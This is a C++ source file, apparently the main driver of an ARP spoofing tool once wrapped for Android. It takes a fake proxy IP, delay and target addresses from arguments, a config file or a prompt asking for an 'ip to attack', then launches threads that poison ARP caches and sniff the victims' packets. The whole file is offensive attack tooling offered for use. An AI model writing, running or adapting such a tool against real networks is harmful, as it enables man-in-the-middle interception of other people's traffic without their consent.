


//#include <jni.h>
#include <stdio.h>
#include "start.h"
#include "Public.h"
#include "Packet.h"
#include "PublicUtils.h"

#include "NetcardInfo.h"
#include "ArpCheat.h"
#include "ClientAddress.h"
#include <signal.h>
#include "NetcardInfo.h"
#include "NetParam.h"
#include "init.h"
#include "ethtool.h"
#include "ArpSniffer.h"
#include <pthread.h>
#include "PacketProcess.h"

#include "start.h"
#include <iostream>
#include <string>
#include <vector>
#include "config.h"

using namespace std;



//extern "C" JNIEXPORT jint JNICALL Java_com_jxt_androidarp_StartActivity_start(JNIEnv * env,jobject obj)
int main(int argc,char ** argv)
{

	printf("program start\r\n");

	int ret = 0;

	if(argc >= 4){
		gFakeProxyIP = inet_addr(argv[1]);
		gArpDelay = atoi(argv[2]);

		unsigned int tmpip = inet_addr(argv[3]);
		ret = Config::addTarget(tmpip,gAttackTarget);
	}else if(argc >= 3){
		gFakeProxyIP = inet_addr(argv[1]);
		gArpDelay = atoi(argv[2]);

	}else if(argc >= 2){
		gFakeProxyIP = inet_addr(argv[1]);
	}


	ret = init::initNetwork();

	string curPath = Public::getPath();

	ret =  ArpCheat::arpSnifferOneTime(gOnlineObjects);

	gFakeProxyIP = Config::getProxyIP(gOnlineObjects);

	ret = Config::getAttackTarget(string(CONFIG_FILENAME),gAttackTarget,&gFakeProxyIP,&gArpDelay);
	if (gAttackTarget.size() <= 0)
	{
		printf("not find config in file:%s\r\n", (string(CONFIG_FILENAME)).c_str());
		do
		{
			printf("Please input ip to attack:");
			char sztargets[4096] = { 0 };
			scanf("%s", sztargets);
			printf("\r\n");

			ret = Config::getAttackTargetFromCmd(sztargets,gAttackTarget);
			if (ret > 0)
			{
				break;
			}
			else {
				printf("error format input\r\n");
			}
		} while (1);
	}

	//ret = ClientAddress::initClientAddress();
#ifdef ATTACK_ALL_ADDRESS
	//ret = ArpSniffer::getHost();
#else
	//ret = ClientAddress::init();
#endif

    pthread_t arpt;
    ret = pthread_create(&arpt,0,ArpCheat::ArpCheatProc,0);

	pthread_t ptt;
	ret = pthread_create(&ptt,0,PacketProcess::clearmap,0);

    pthread_t packett;
    ret = pthread_create(&packett,0,PacketProcess::SnifferPacket,0);


    while(1){
    	sleep(1);
    }

    exit(0);
}
